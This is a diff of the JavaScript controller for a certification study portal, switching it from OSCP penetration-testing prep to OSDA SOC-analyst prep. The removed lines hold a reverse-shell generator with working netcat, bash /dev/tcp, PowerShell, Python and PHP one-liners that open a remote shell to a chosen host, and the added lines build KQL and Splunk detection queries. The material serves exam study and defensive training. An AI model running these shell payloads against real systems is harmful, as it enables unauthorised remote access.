@@ -1,7 +1,7 @@
 /* ==========================================================================
-   OSCP PREP PORTAL APPLICATION CONTROLLER (app.js)
-   Controls navigation, generation of HTML from data, reverse shell calculation,
-   local storage mechanisms, search filters, and progress calculations.
+   OSDA PREP PORTAL APPLICATION CONTROLLER (app.js)
+   Controls navigation, log queries compilation, practice labs selectors,
+   target track scorecards, and local progress storage.
    ========================================================================== */
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -19,18 +19,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // State variables loaded from LocalStorage
   let currentTab = 'dashboard';
-  let masteredSubtopics = safeJSONParse('oscp_mastered_subtopics', []);
-  let completedPractice = safeJSONParse('oscp_completed_practice', []);
+  let masteredSubtopics = safeJSONParse('osda_mastered_subtopics', []);
+  let completedPractice = safeJSONParse('osda_completed_practice', []);
   
   // Default Target list for Exam Tracker
   const defaultTargets = [
-    { name: 'AD-Set Client', type: 'Active Directory (Client)', points: 10, foothold: false, root: false, screenshot: false, verified: false },
-    { name: 'AD-Set DC', type: 'Active Directory (Domain Controller)', points: 30, foothold: false, root: false, screenshot: false, verified: false },
-    { name: 'Standalone Alpha', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false },
-    { name: 'Standalone Beta', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false },
-    { name: 'Standalone Gamma', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false }
+    { name: 'Target 1 (Web)', type: 'Foothold Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false },
+    { name: 'Target 2 (Escalation)', type: 'Privilege Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false },
+    { name: 'Target 3 (Pivoting)', type: 'Lateral Hops Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false },
+    { name: 'AD Domain DC', type: 'Forest Trust Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false }
   ];
-  let targetMachines = safeJSONParse('oscp_targets', defaultTargets);
+  let targetMachines = safeJSONParse('osda_targets', defaultTargets);
 
   // DOM Elements cache
   const navButtons = document.querySelectorAll('.nav-btn');
@@ -41,7 +40,6 @@ document.addEventListener('DOMContentLoaded', () => {
   
   // Dashboard stats
   const statTotalTopics = document.getElementById('stats-total-topics');
-
   const statCompletionBadge = document.getElementById('stats-completion-badge');
   
   // Views headings
@@ -50,13 +48,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Title dictionary for views
   const viewHeadings = {
-    dashboard: { title: 'Dashboard Overview', subtitle: 'Interactive tracker and statistics for your PEN-200 / OSCP prep.' },
-    knowledge: { title: 'Syllabus Knowledge Portal', subtitle: 'Search and review all PEN-200 syllabus points, code blocks, and critical exam commands.' },
-    timeline: { title: 'Exam Timeline & Checklist', subtitle: 'Step-by-step milestones to stay on schedule and prevent fatigue during the 24h exam.' },
-    generator: { title: 'Active Reverse Shell Constructor', subtitle: 'Input your attacking environment parameters to generate custom payload shells.' },
-    tracker: { title: 'Live Exam-Day Machine Tracker', subtitle: 'Log findings, track machine flags, and tally your total points dynamically.' },
-    practice: { title: 'CTF Practice Machines Guide', subtitle: 'Curated list of vulnerable targets from PG, HTB, and VulnHub matching exam skillsets.' },
-    resources: { title: 'Quick References & File Transfers', subtitle: 'Crucial cheat sheets, direct tools links, and network transfer commands.' }
+    dashboard: { title: 'Dashboard Overview', subtitle: 'Interactive tracker and statistics for your SOC-200 / OSDA prep.' },
+    knowledge: { title: 'SOC Knowledge Portal', subtitle: 'Search and review all SOC-200 syllabus points, code blocks, and critical detection queries.' },
+    timeline: { title: 'Detection Timeline & Checklist', subtitle: 'Step-by-step milestones to stay on schedule and organize logs timeline during the 24h exam.' },
+    generator: { title: 'SIEM Query Builder', subtitle: 'Input attacker attributes to generate custom KQL and Splunk SPL queries.' },
+    tracker: { title: 'Live Incident Logs Audit', subtitle: 'Log findings, track machine log sources, and tally your total points dynamically.' },
+    practice: { title: 'Defensive Investigation Labs', subtitle: 'Curated list of log challenges from CyberDefenders, HTB, and PG matching SOC skillsets.' },
+    resources: { title: 'Quick References & Time Sync', subtitle: 'Crucial reference links, timezone tools, and network audit command scripts.' }
   };
 
   /* ==========================================================================
@@ -128,7 +126,7 @@ document.addEventListener('DOMContentLoaded', () => {
      ========================================================================== */
   function calculateTotalSubtopics() {
     let total = 0;
-    oscpData.topics.forEach(topic => {
+    osdaData.topics.forEach(topic => {
       total += topic.subtopics.length;
     });
     return total;
@@ -164,9 +162,6 @@ document.addEventListener('DOMContentLoaded', () => {
   function updateDashboardData() {
     const totalSubtopics = calculateTotalSubtopics();
     statTotalTopics.textContent = `${masteredSubtopics.length} / ${totalSubtopics}`;
-    
-
-    
     updateMasteryProgressBar();
   }
 
@@ -199,10 +194,10 @@ document.addEventListener('DOMContentLoaded', () => {
     categoryFiltersContainer.appendChild(allChip);
 
     // Individual category chips
-    oscpData.topics.forEach(topic => {
+    osdaData.topics.forEach(topic => {
       const chip = document.createElement('div');
       chip.className = `filter-chip ${selectedCategoryFilter === topic.id ? 'active' : ''}`;
-      chip.textContent = topic.title.split(' & ')[0].split(' ')[0]; // short representation
+      chip.textContent = topic.title.split(' ')[0]; // short representation
       chip.addEventListener('click', () => {
         selectedCategoryFilter = topic.id;
         renderCategoryFilters();
@@ -218,7 +213,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const searchVal = knowledgeSearchInput ? knowledgeSearchInput.value.toLowerCase() : '';
     knowledgeContainer.innerHTML = '';
 
-    oscpData.topics.forEach(topic => {
+    osdaData.topics.forEach(topic => {
       // Category filter check
       if (selectedCategoryFilter !== 'all' && topic.id !== selectedCategoryFilter) return;
 
@@ -274,7 +269,7 @@ document.addEventListener('DOMContentLoaded', () => {
           <p class="subtopic-desc">${sub.details}</p>
           <div class="commands-container"></div>
           <div class="tips-container">
-            <h5><i class="fa-solid fa-lightbulb"></i> Study Tips & Exam Tricks</h5>
+            <h5><i class="fa-solid fa-lightbulb"></i> Analysis Tips & Triggers</h5>
             <ul class="tips-list"></ul>
           </div>
         `;
@@ -347,13 +342,13 @@ document.addEventListener('DOMContentLoaded', () => {
       buttonElement.innerHTML = `<i class="fa-solid fa-check"></i> Mastered`;
     }
     
-    localStorage.setItem('oscp_mastered_subtopics', JSON.stringify(masteredSubtopics));
+    localStorage.setItem('osda_mastered_subtopics', JSON.stringify(masteredSubtopics));
     updateMasteryProgressBar();
 
     // Re-render topic header count tag without completely rebuilding DOM node to keep animation stable
     const parentWrapper = document.getElementById(`topic-${categoryId}`);
     if (parentWrapper) {
-      const topicObj = oscpData.topics.find(t => t.id === categoryId);
+      const topicObj = osdaData.topics.find(t => t.id === categoryId);
       const masteredInCategory = topicObj.subtopics.filter(sub => masteredSubtopics.includes(`${categoryId}_${sub.name}`)).length;
       const tag = parentWrapper.querySelector('.mastery-tag');
       if (tag) {
@@ -371,7 +366,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!timelineFlow) return;
     timelineFlow.innerHTML = '';
 
-    oscpData.moments.forEach((mom, idx) => {
+    osdaData.moments.forEach((mom, idx) => {
       const card = document.createElement('div');
       card.className = 'timeline-moment-card glass-card';
       
@@ -403,42 +398,51 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-
   /* ==========================================================================
-     Shell payload Constructor
+     SIEM Log Queries Constructor
      ========================================================================== */
-  const lhostInput = document.getElementById('lhost');
-  const lportInput = document.getElementById('lport');
+  const attackerIpInput = document.getElementById('attacker_ip');
+  const targetHostInput = document.getElementById('target_host');
+  const targetUserInput = document.getElementById('target_user');
+  const processNameInput = document.getElementById('process_name');
   
-  const ncCode = document.getElementById('nc-code');
-  const bashCode = document.getElementById('bash-code');
-  const powershellCode = document.getElementById('powershell-code');
-  const pythonCode = document.getElementById('python-code');
-  const phpCode = document.getElementById('php-code');
+  const qProcess = document.getElementById('q-process');
+  const qAuth = document.getElementById('q-auth');
+  const qNetwork = document.getElementById('q-network');
 
-  if (lhostInput && lportInput) {
-    lhostInput.addEventListener('input', updateReverseShells);
-    lportInput.addEventListener('input', updateReverseShells);
+  if (attackerIpInput && targetHostInput && targetUserInput && processNameInput) {
+    attackerIpInput.addEventListener('input', updateSIEMQueries);
+    targetHostInput.addEventListener('input', updateSIEMQueries);
+    targetUserInput.addEventListener('input', updateSIEMQueries);
+    processNameInput.addEventListener('input', updateSIEMQueries);
   }
 
-  function updateReverseShells() {
-    const lhost = lhostInput.value || '10.10.14.5';
-    const lport = lportInput.value || '4444';
+  function updateSIEMQueries() {
+    const aIp = attackerIpInput.value || '10.10.14.5';
+    const tHost = targetHostInput.value || 'WIN-DC01';
+    const tUser = targetUserInput.value || 'Administrator';
+    const pName = processNameInput.value || 'psexec.exe';
 
-    // 1. Netcat
-    ncCode.textContent = `nc -e /bin/bash ${lhost} ${lport}`;
+    // 1. Process Creation
+    qProcess.textContent = `[Kibana KQL]
+event.code: ("4688" OR "1") AND (process.name: "${pName}" OR process.command_line: *${pName}*) AND host.name: "${tHost}"
 
-    // 2. Bash
-    bashCode.textContent = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+[Splunk SPL]
+index=windows (EventCode=4688 OR EventCode=1) (NewProcessName="*${pName}" OR Image="*${pName}" OR CommandLine="*${pName}*") Computer="${tHost}"`;
 
-    // 3. PowerShell
-    powershellCode.textContent = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+    // 2. Authentication Logons
+    qAuth.textContent = `[Kibana KQL]
+event.code: ("4624" OR "4625") AND user.name: "${tUser}" AND source.ip: "${aIp}"
 
-    // 4. Python
-    pythonCode.textContent = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
+[Splunk SPL]
+index=windows (EventCode=4624 OR EventCode=4625) TargetUserName="${tUser}" SourceAddress="${aIp}"`;
 
-    // 5. PHP
-    phpCode.textContent = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+    // 3. Network Connections
+    qNetwork.textContent = `[Kibana KQL]
+event.code: "3" AND destination.ip: "${aIp}" AND (host.name: "${tHost}" OR source.ip: "${tHost}")
+
+[Splunk SPL]
+index=windows EventCode=3 DestinationIp="${aIp}" (Computer="${tHost}" OR SourceIp="${tHost}")`;
   }
 
   // Handle Shell Card Copy triggers
@@ -464,20 +468,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (addTargetBtn) {
     addTargetBtn.addEventListener('click', () => {
-      const name = prompt("Enter Target machine alias (e.g. Standalone Delta):");
+      const name = prompt("Enter Target hostname/incident (e.g. Linux Web server):");
       if (!name) return;
-      const type = prompt("Enter Machine Points Weight (e.g., 20):", "20");
-      if (!type) return;
 
-      const pts = parseInt(type) || 20;
       targetMachines.push({
         name: name,
-        type: `Custom Target (${pts} pts)`,
-        points: pts,
+        type: `Custom Target (20 pts)`,
+        points: 20,
         foothold: false,
-        root: false,
-        screenshot: false,
-        verified: false
+        recon: false,
+        escalation: false,
+        documented: false
       });
 
       saveTargets();
@@ -486,7 +487,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function saveTargets() {
-    localStorage.setItem('oscp_targets', JSON.stringify(targetMachines));
+    localStorage.setItem('osda_targets', JSON.stringify(targetMachines));
   }
 
   function renderTrackerTable() {
@@ -501,26 +502,26 @@ document.addEventListener('DOMContentLoaded', () => {
         <td>${machine.type}</td>
         <td>
           <button class="toggle-td-btn ${machine.foothold ? 'secured' : ''}" data-idx="${idx}" data-field="foothold">
-            <i class="fa-solid ${machine.foothold ? 'fa-lock-open' : 'fa-lock'}"></i> ${machine.foothold ? 'Secured' : 'Foothold'}
+            <i class="fa-solid ${machine.foothold ? 'fa-circle-check' : 'fa-circle'}"></i> ${machine.foothold ? 'Ingested' : 'Log Audit'}
           </button>
         </td>
         <td>
-          <button class="toggle-td-btn ${machine.root ? 'secured' : ''}" data-idx="${idx}" data-field="root">
-            <i class="fa-solid ${machine.root ? 'fa-shield-halved' : 'fa-shield'}"></i> ${machine.root ? 'SYSTEM' : 'Root'}
+          <button class="toggle-td-btn ${machine.recon ? 'secured' : ''}" data-idx="${idx}" data-field="recon">
+            <i class="fa-solid ${machine.recon ? 'fa-circle-check' : 'fa-circle'}"></i> ${machine.recon ? 'Tracked' : 'Recon'}
           </button>
         </td>
         <td>
-          <button class="toggle-td-btn ${machine.screenshot ? 'secured' : ''}" data-idx="${idx}" data-field="screenshot">
-            <i class="fa-solid ${machine.screenshot ? 'fa-image' : 'fa-camera'}"></i> ${machine.screenshot ? 'Saved' : 'Screenshot'}
+          <button class="toggle-td-btn ${machine.escalation ? 'secured' : ''}" data-idx="${idx}" data-field="escalation">
+            <i class="fa-solid ${machine.escalation ? 'fa-circle-check' : 'fa-circle'}"></i> ${machine.escalation ? 'Traced' : 'PrivEsc'}
           </button>
         </td>
         <td>
-          <button class="toggle-td-btn ${machine.verified ? 'secured' : ''}" data-idx="${idx}" data-field="verified">
-            <i class="fa-solid ${machine.verified ? 'fa-circle-check' : 'fa-circle'}"></i> ${machine.verified ? 'Verified' : 'Verify'}
+          <button class="toggle-td-btn ${machine.documented ? 'secured' : ''}" data-idx="${idx}" data-field="documented">
+            <i class="fa-solid ${machine.documented ? 'fa-circle-check' : 'fa-circle'}"></i> ${machine.documented ? 'Logged' : 'Timeline'}
           </button>
         </td>
         <td>
-          <button class="btn-icon-only text-red delete-target-btn" aria-label="Delete Target Machine" data-idx="${idx}">
+          <button class="btn-icon-only text-red delete-target-btn" data-idx="${idx}" aria-label="Delete Incident Target">
             <i class="fa-solid fa-trash-can"></i>
           </button>
         </td>
@@ -539,7 +540,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       // Wire target delete trigger
       tr.querySelector('.delete-target-btn').addEventListener('click', () => {
-        if (confirm(`Remove machine "${machine.name}" from target list?`)) {
+        if (confirm(`Remove incident "${machine.name}" from target list?`)) {
           targetMachines.splice(idx, 1);
           saveTargets();
           renderTrackerTable();
@@ -556,25 +557,20 @@ document.addEventListener('DOMContentLoaded', () => {
     let score = 0;
 
     targetMachines.forEach(machine => {
-      // Active Directory is all-or-nothing (40 pts total)
-      // Standard standalones are split: 50% for user (foothold), 50% for system (root)
-      const points = machine.points;
-      
-      if (machine.type.includes('Active Directory')) {
-        // If it's AD, you only get points if root is compromised on DC (whole AD compromised)
-        // However, for granularity during study/exam track:
-        // We'll give AD Foothold 10 pts (Client System) and AD DC Root 30 pts (DC System)
-        if (machine.name.includes('Client') && machine.root) {
-          score += 10;
-        } else if (machine.name.includes('DC') && machine.root) {
-          score += 30;
-        }
-      } else {
-        // Standalone
-        if (machine.foothold) score += points / 2;
-        if (machine.root) score += points / 2;
-      }
+      // 4 audit steps, each worth 5 points to sum up to 20 pts per machine
+      if (machine.foothold) score += 5;
+      if (machine.recon) score += 5;
+      if (machine.escalation) score += 5;
+      if (machine.documented) score += 5;
     });
+
+    // Automatically award 20 report outline points if the candidate completes all incident trackers
+    // To keep it simple: maximum score is the sum of completed points (max 100 if 4 targets + 20 report pts)
+    // We'll award report compile buffer (20 pts) when target timeline items are logged
+    let loggedIncidents = targetMachines.filter(m => m.documented).length;
+    if (loggedIncidents === targetMachines.length && targetMachines.length > 0) {
+      score += 20; // 20 pts for complete Incident Timeline report outline
+    }
 
     // Update displays
     liveScoreText.textContent = score;
@@ -582,7 +578,7 @@ document.addEventListener('DOMContentLoaded', () => {
     liveScoreBar.style.width = `${progressPercent}%`;
 
     if (score >= 70) {
-      liveScoreStatus.textContent = "PASS SECURED! Ensure documentation is full.";
+      liveScoreStatus.textContent = "PASS SECURED! Ensure timelines contain query logs.";
       liveScoreStatus.className = "score-status text-center passed";
       liveScoreBar.style.background = "linear-gradient(90deg, var(--neon-teal), #22c55e)";
     } else {
@@ -590,89 +586,6 @@ document.addEventListener('DOMContentLoaded', () => {
       liveScoreStatus.className = "score-status text-center";
       liveScoreBar.style.background = "linear-gradient(90deg, var(--neon-blue), var(--neon-purple))";
     }
-  }
-
-  /* ==========================================================================
-     Toast notifications & Clipboard Systems
-     ========================================================================== */
-  const toast = document.getElementById('toast');
-
-  function copyTextToClipboard(text) {
-    if (!navigator.clipboard) {
-      // Fallback
-      const textArea = document.createElement("textarea");
-      textArea.value = text;
-      textArea.style.top = "0";
-      textArea.style.left = "0";
-      textArea.style.position = "fixed";
-      document.body.appendChild(textArea);
-      textArea.focus();
-      textArea.select();
-      try {
-        document.execCommand('copy');
-        showToast("Copied command to clipboard!");
-      } catch (err) {
-        showToast("Error copying text");
-      }
-      document.body.removeChild(textArea);
-      return;
-    }
-    
-    navigator.clipboard.writeText(text).then(() => {
-      showToast("Copied command to clipboard!");
-    }, () => {
-      showToast("Error copying text");
-    });
-  }
-
-  function showToast(message) {
-    if (!toast) return;
-    toast.textContent = message;
-    toast.classList.add('show');
-    setTimeout(() => {
-      toast.classList.remove('show');
-    }, 2500);
-  }
-
-  /* ==========================================================================
-     Global Reset Control
-     ========================================================================== */
-  const resetBtn = document.getElementById('reset-data');
-  if (resetBtn) {
-    resetBtn.addEventListener('click', () => {
-      if (confirm("WARNING: Are you sure you want to reset all syllabus progress, exam moments checklist, and target trackers? This cannot be undone.")) {
-        localStorage.removeItem('oscp_mastered_subtopics');
-        localStorage.removeItem('oscp_targets');
-        localStorage.removeItem('oscp_completed_practice');
-        
-        masteredSubtopics = [];
-        completedPractice = [];
-        targetMachines = [
-          { name: 'AD-Set Client', type: 'Active Directory (Client)', points: 10, foothold: false, root: false, screenshot: false, verified: false },
-          { name: 'AD-Set DC', type: 'Active Directory (Domain Controller)', points: 30, foothold: false, root: false, screenshot: false, verified: false },
-          { name: 'Standalone Alpha', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false },
-          { name: 'Standalone Beta', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false },
-          { name: 'Standalone Gamma', type: 'Standalone (20 pts)', points: 20, foothold: false, root: false, screenshot: false, verified: false }
-        ];
-
-        saveTargets();
-        switchTab('dashboard');
-        updateDashboardData();
-        showToast("All progress has been reset.");
-      }
-    });
-  }
-
-  /* ==========================================================================
-     Helper Utilities
-     ========================================================================== */
-  function escapeHtml(text) {
-    return text
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;")
-      .replace(/'/g, "&#039;");
   }
 
   /* ==========================================================================
@@ -689,7 +602,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!practiceTbody) return;
     practiceTbody.innerHTML = '';
 
-    const filtered = oscpData.vulnerableMachines.filter(m => {
+    const filtered = osdaData.vulnerableMachines.filter(m => {
       const matchPlatform = filterPlatform === 'all' || m.platform === filterPlatform;
       const matchOs = filterOs === 'all' || m.os === filterOs;
       const matchDiff = filterDifficulty === 'all' || m.difficulty === filterDifficulty;
@@ -706,7 +619,9 @@ document.addEventListener('DOMContentLoaded', () => {
       tr.innerHTML = `
         <td style="text-align: left; font-weight: 600;">${machine.name}</td>
         <td>${machine.platform}</td>
-        <td>${machine.os === 'Linux' ? '<i class="fa-brands fa-linux text-teal"></i> Linux' : '<i class="fa-brands fa-windows text-blue"></i> Windows'}</td>
+        <td>${machine.os === 'Linux' ? '<i class="fa-brands fa-linux text-teal"></i> Linux' : 
+             machine.os === 'Windows' ? '<i class="fa-brands fa-windows text-blue"></i> Windows' : 
+             '<i class="fa-solid fa-server text-purple"></i> Mixed'}</td>
         <td><span class="moment-badge" style="background: rgba(0, 0, 0, 0.03); color: var(--text-secondary); border: 1px solid var(--panel-border); font-size: 0.75rem;">${machine.difficulty}</span></td>
         <td style="text-align: left;">${machine.focus}</td>
         <td>
@@ -725,7 +640,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     if (practiceCountSummary) {
-      practiceCountSummary.textContent = `Showing ${filtered.length} / ${oscpData.vulnerableMachines.length} Machines (${completedCount} completed)`;
+      practiceCountSummary.textContent = `Showing ${filtered.length} / ${osdaData.vulnerableMachines.length} Labs (${completedCount} completed)`;
     }
   }
 
@@ -736,7 +651,7 @@ document.addEventListener('DOMContentLoaded', () => {
     } else {
       completedPractice.push(machineName);
     }
-    localStorage.setItem('oscp_completed_practice', JSON.stringify(completedPractice));
+    localStorage.setItem('osda_completed_practice', JSON.stringify(completedPractice));
     renderPracticeTable();
   }
 
@@ -768,8 +683,88 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
+  /* ==========================================================================
+     Toast notifications & Clipboard Systems
+     ========================================================================== */
+  const toast = document.getElementById('toast');
+
+  function copyTextToClipboard(text) {
+    if (!navigator.clipboard) {
+      // Fallback
+      const textArea = document.createElement("textarea");
+      textArea.value = text;
+      textArea.style.top = "0";
+      textArea.style.left = "0";
+      textArea.style.position = "fixed";
+      document.body.appendChild(textArea);
+      textArea.focus();
+      textArea.select();
+      try {
+        document.execCommand('copy');
+        showToast("Copied query to clipboard!");
+      } catch (err) {
+        showToast("Error copying text");
+      }
+      document.body.removeChild(textArea);
+      return;
+    }
+    
+    navigator.clipboard.writeText(text).then(() => {
+      showToast("Copied query to clipboard!");
+    }, () => {
+      showToast("Error copying text");
+    });
+  }
+
+  function showToast(message) {
+    if (!toast) return;
+    toast.textContent = message;
+    toast.classList.add('show');
+    setTimeout(() => {
+      toast.classList.remove('show');
+    }, 2500);
+  }
+
+  /* ==========================================================================
+     Global Reset Control
+     ========================================================================== */
+  const resetBtn = document.getElementById('reset-data');
+  if (resetBtn) {
+    resetBtn.addEventListener('click', () => {
+      if (confirm("WARNING: Are you sure you want to reset all syllabus progress, exam moments checklist, and target trackers? This cannot be undone.")) {
+        localStorage.removeItem('osda_mastered_subtopics');
+        localStorage.removeItem('osda_completed_practice');
+        localStorage.removeItem('osda_targets');
+        
+        masteredSubtopics = [];
+        completedPractice = [];
+        targetMachines = [
+          { name: 'Target 1 (Web)', type: 'Foothold Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false },
+          { name: 'Target 2 (Escalation)', type: 'Privilege Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false },
+          { name: 'Target 3 (Pivoting)', type: 'Lateral Hops Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false },
+          { name: 'AD Domain DC', type: 'Forest Trust Audit (20 pts)', points: 20, foothold: false, recon: false, escalation: false, documented: false }
+        ];
+
+        saveTargets();
+        switchTab('dashboard');
+        updateDashboardData();
+        showToast("All progress has been reset.");
+      }
+    });
+  }
+
+  // Helper Utilities
+  function escapeHtml(text) {
+    return text
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#039;");
+  }
+
   // Initialize
   renderCategoryFilters();
   updateDashboardData();
-  updateReverseShells();
+  updateSIEMQueries();
 });
